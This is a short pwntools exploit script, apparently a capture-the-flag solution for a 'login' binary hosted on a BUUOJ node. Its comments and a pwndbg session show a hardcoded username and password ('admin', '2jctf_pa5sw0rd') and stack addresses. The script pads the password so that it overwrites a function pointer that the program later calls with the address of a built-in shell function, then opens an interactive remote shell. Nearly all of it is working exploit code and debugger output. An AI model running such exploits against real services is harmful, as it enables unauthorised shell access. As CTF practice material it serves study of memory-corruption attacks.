from pwn import *
context.arch='amd64'
# it's a c++ program, it's difficult to read,
# but we still could find it will execve 'call rax' when check the pwd and usr,
# and the pwd,usr are in the program,
# otherwise, there is a function which can getshell,
# because the input is on the stack, we could change the value of rax to getshell by overwrite on stack

# p = process('./login')
p = remote('node3.buuoj.cn',28108)

# pwndbg> b *0x0000000000400DA6
# Breakpoint 1 at 0x400da2
# pwndbg> b *0x0000000000400A51
# Breakpoint 2 at 0x400a51
# pwndbg> r
# Starting program: /home/nop/Desktop/login 
#  _____   _  ____ _____ _____   _                _       
# |__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  
#   / /_  | | |     | | | |_    | |   / _ \ / _` | | '_ \ 
#  / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |
# /____\___/ \____| |_| |_|     |_____\___/ \__, |_|_| |_|
#                                           |___/         
# Please enter username: admin
# Please enter password: 2jctf_pa5sw0rd
# ......
# pwndbg> x/x $rax
# 0x7fffffffdae0: 0x74636a32   <== password in stack
# pwndbg> c
# Continuing.
# Password accepted: Password accepted: 
# ......
# 0x400a51    mov    rax, qword ptr [rax] <== rax iclude a addr which will be called 
# 0x400a54    call   rax
# ......
# Breakpoint *0x0000000000400A51
# pwndbg> x/x $rax
# 0x7fffffffdb28: 0x004000b4


shell = 0x0000000000400E88  # function which in program could getshell
p.recvuntil('Please enter username:')
p.sendline('admin')
p.recvuntil('Please enter password:')
payload = '2jctf_pa5sw0rd'.ljust(0x7fffffffdb28-0x7fffffffdae0,'\x00') + p64(shell)
p.sendline(payload)
p.recvuntil("Password accepted")
p.interactive()
